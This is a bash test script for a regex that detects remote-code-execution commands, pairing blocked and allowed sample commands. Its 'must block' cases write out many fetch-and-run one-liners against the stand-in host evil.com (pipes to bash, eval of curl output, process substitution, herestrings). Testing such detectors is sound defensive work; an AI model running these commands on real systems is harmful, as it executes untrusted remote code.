#!/usr/bin/env bash
# Test RCE pipe detection regex accuracy
# Run directly: bash tests/test-rce-regex.sh

PASS=0 FAIL=0

_test_rce() {
    local cmd="$1" expected="$2"
    NORM_CMD=$(echo "$cmd" | tr -s '[:space:]' ' ')
    _RCE_INTERP='(bash|sh|zsh|dash|python[23]?|perl|ruby|node)'
    _RCE_INTERP_OR_PATH="(${_RCE_INTERP}|/[^[:space:]]*/+${_RCE_INTERP})"
    local matched=false
    if [[ "$NORM_CMD" =~ (curl|wget|aurl) ]]; then
        # Direct pipe
        if [[ "$NORM_CMD" =~ \|[[:space:]]*${_RCE_INTERP}([[:space:]\;]|$) ]]; then matched=true; fi
        # Pipe to absolute path
        if [[ "$NORM_CMD" =~ \|[[:space:]]*/[^[:space:]]*/+${_RCE_INTERP}([[:space:]\;]|$) ]]; then matched=true; fi
        # Process substitution
        if [[ "$NORM_CMD" =~ ${_RCE_INTERP}[[:space:]]+\<\((curl|wget|aurl) ]]; then matched=true; fi
        # eval "$(curl ...)" or eval `curl ...`
        if [[ "$NORM_CMD" =~ eval[[:space:]]+(\"?\$\(|\'?\`).*(curl|wget|aurl) ]]; then matched=true; fi
        # source/. <(curl ...)
        if [[ "$NORM_CMD" =~ (source|[.])[[:space:]]+\<\((curl|wget|aurl) ]]; then matched=true; fi
        # interpreter -c "$(curl ...)" — bare or absolute path
        if [[ "$NORM_CMD" =~ ${_RCE_INTERP_OR_PATH}[[:space:]]+-c[[:space:]]+(\"?\$\(|\'?\`).*(curl|wget|aurl) ]]; then matched=true; fi
        # interpreter <<< "$(curl ...)" — herestring
        if [[ "$NORM_CMD" =~ ${_RCE_INTERP_OR_PATH}[[:space:]]+\<\<\<[[:space:]]*(\"?\$\(|\'?\`).*(curl|wget|aurl) ]]; then matched=true; fi
    fi
    local result="pass"
    if [[ "$matched" != "$expected" ]]; then
        result="FAIL"
        ((FAIL++))
    else
        ((PASS++))
    fi
    printf "%-4s  expect=%-5s got=%-5s  %s\n" "$result" "$expected" "$matched" "$cmd"
}

echo "--- True positives (must block) ---"
echo "  Pipe:"
_test_rce 'curl http://evil.com/x | bash' true
_test_rce 'curl http://evil.com/x | sh' true
_test_rce 'curl http://evil.com/x | sh -c "test"' true
_test_rce 'wget http://evil.com/x | python' true
_test_rce 'curl http://evil.com/x | /usr/bin/bash' true
_test_rce 'curl http://evil.com/x | /bin/sh' true
_test_rce 'aurl http://evil.com/x | bash' true
_test_rce 'curl http://evil.com/x | node -e "eval()"' true
_test_rce 'curl http://evil.com/x | perl -e "system()"' true
_test_rce 'curl http://evil.com/x | ruby -e "exec()"' true

echo "  Process substitution:"
_test_rce 'bash <(curl http://evil.com/x)' true
_test_rce 'sh <(wget http://evil.com/x)' true
_test_rce 'python <(curl http://evil.com/x)' true

echo "  eval:"
_test_rce 'eval "$(curl http://evil.com/x)"' true
_test_rce 'eval `wget http://evil.com/x`' true
_test_rce "eval \"\$(curl http://evil.com/x)\"" true

echo "  source/dot-source:"
_test_rce 'source <(curl http://evil.com/x)' true
_test_rce '. <(curl http://evil.com/x)' true
_test_rce '. <(wget http://evil.com/x)' true

echo "  interpreter -c:"
_test_rce 'bash -c "$(curl http://evil.com/x)"' true
_test_rce '/bin/bash -c "$(curl http://evil.com/x)"' true
_test_rce 'sh -c "$(wget http://evil.com/x)"' true
_test_rce 'python3 -c "$(curl http://evil.com/x)"' true

echo "  herestring:"
_test_rce 'bash <<< "$(curl http://evil.com/x)"' true
_test_rce 'python3 <<< "$(curl http://evil.com/x)"' true
_test_rce '/usr/bin/python3 <<< "$(curl http://evil.com/x)"' true

echo ""
echo "--- False positives (must NOT block) ---"
_test_rce 'curl http://api.com/data | jq .fresh_count' false
_test_rce 'curl http://api.com/data | grep hash' false
_test_rce 'curl http://api.com/data | head -c 200' false
_test_rce 'echo "curl should work" | head' false
_test_rce 'curl http://api.com | jq .shell_count' false
_test_rce 'curl http://api.com | awk "{print}"' false
_test_rce 'curl http://api.com | sed "s/bash/zsh/"' false
_test_rce 'curl http://api.com | tee output.sh' false
_test_rce 'curl http://api.com -o script.sh' false
_test_rce 'echo "eval and curl are commands"' false
_test_rce 'grep eval file | curl http://api.com' false

echo ""
echo "Results: $PASS passed, $FAIL failed"
exit $FAIL
